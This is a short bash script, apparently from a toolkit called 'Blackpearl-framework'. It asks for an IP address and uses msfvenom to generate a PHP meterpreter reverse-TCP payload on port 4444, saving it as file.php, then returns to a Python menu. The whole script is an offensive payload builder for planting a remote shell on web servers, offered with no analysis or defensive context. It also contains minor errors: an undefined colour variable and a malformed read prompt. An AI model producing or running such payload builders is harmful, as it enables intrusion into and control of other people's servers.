#!/bin/bash 

r='\e[1;31m' 

clear 

read -p $R"IP :" ip

echo 

echo -e $r"Making payload"

msfvenom -p php/meterpreter_reverse_tcp LHOST=$ip LPORT=4444 -f raw > file.php

echo

echo

read -p $r "Press enter to go back" enter

cd Blackpearl-framework/lib

python msf.py
